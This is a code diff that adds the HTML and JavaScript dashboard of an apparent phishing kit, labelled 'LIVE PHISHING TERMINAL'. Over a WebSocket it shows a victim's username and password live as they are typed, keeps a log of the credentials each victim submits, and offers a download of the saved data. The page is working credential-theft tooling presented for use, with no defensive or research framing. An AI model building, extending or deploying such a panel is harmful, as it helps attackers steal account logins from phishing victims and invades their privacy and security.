@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Capture - Admin Panel</title>
+    <style>
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 20px;
+            margin: 0;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #30363d;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        h1 { 
+            color: #58a6ff; 
+            margin: 0;
+            font-size: 24px;
+            text-shadow: 0 0 10px rgba(88, 166, 255, 0.5);
+        }
+        .btn-download {
+            background: #238636;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            font-family: inherit;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .btn-download:hover { background: #2ea043; }
+        
+        .live-box {
+            background: #161b22;
+            border: 2px solid #d2a8ff;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px rgba(210, 168, 255, 0.2);
+        }
+        .live-text {
+            font-size: 28px;
+            color: #79c0ff;
+            min-height: 40px;
+            word-wrap: break-word;
+            letter-spacing: 2px;
+        }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+
+        .terminal {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 20px;
+            min-height: 200px;
+            max-height: 50vh;
+            overflow-y: auto;
+        }
+        .log-entry {
+            margin-bottom: 15px;
+            border-left: 3px solid #238636;
+            padding-left: 15px;
+            animation: fadeIn 0.5s;
+            background: rgba(35, 134, 54, 0.1);
+            padding: 10px;
+            border-radius: 0 5px 5px 0;
+        }
+        .time { color: #8b949e; font-size: 14px; margin-bottom: 5px; }
+        .highlight { color: #ff7b72; font-weight: bold; font-size: 20px; }
+        .label { color: #8b949e; font-size: 14px; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>💀 LIVE PHISHING TERMINAL 💀</h1>
+        <a href="/captured_data.json" download class="btn-download">⬇ Download Saved Data</a>
+    </div>
+    
+    <div class="live-box">
+        <p style="color: #8b949e; font-size: 14px; margin-bottom: 10px;">[ LIVE KEYLOGGER ACTIVE - WATCH VICTIM TYPE ]</p>
+        <div class="live-text">
+            <span id="live-username" style="color: #7ee787;"></span>
+            <span id="live-password" style="color: #ff7b72;"></span><span class="blink">_</span>
+        </div>
+    </div>
+
+    <p style="color: #8b949e; margin-bottom: 10px; font-weight: bold;">[ FINAL SUBMITTED DATA RECORD ]</p>
+    <div class="terminal" id="terminal">
+        <p style="color: #8b949e; font-style: italic;">Waiting for victim to hit Log In...</p>
+    </div>
+
+    <script>
+        const ws = new WebSocket(`ws://${window.location.host}`);
+        const terminal = document.getElementById('terminal');
+        const liveUser = document.getElementById('live-username');
+        const livePass = document.getElementById('live-password');
+        let isFirstData = true;
+
+        ws.onmessage = function(event) {
+            const data = JSON.parse(event.data);
+            
+            if(data.type === 'live') {
+                if(data.field === 'username') liveUser.innerText = data.value;
+                if(data.field === 'password') livePass.innerText = data.value;
+            }
+            
+            if(data.type === 'final') {
+                if(isFirstData) {
+                    terminal.innerHTML = ''; 
+                    isFirstData = false;
+                }
+
+                const entry = document.createElement('div');
+                entry.className = 'log-entry';
+                entry.innerHTML = `
+                    <div class="time">[${data.time}] 🚨 Login Attempt Intercepted</div>
+                    <div><span class="label">Username:</span> <span class="highlight">${data.username}</span></div>
+                    <div><span class="label">Password:</span> <span class="highlight">${data.password}</span></div>
+                `;
+                terminal.prepend(entry); 
+                
+                setTimeout(() => {
+                    liveUser.innerText = "";
+                    livePass.innerText = "";
+                }, 2000);
+            }
+        };
+    </script>
+</body>
+</html>
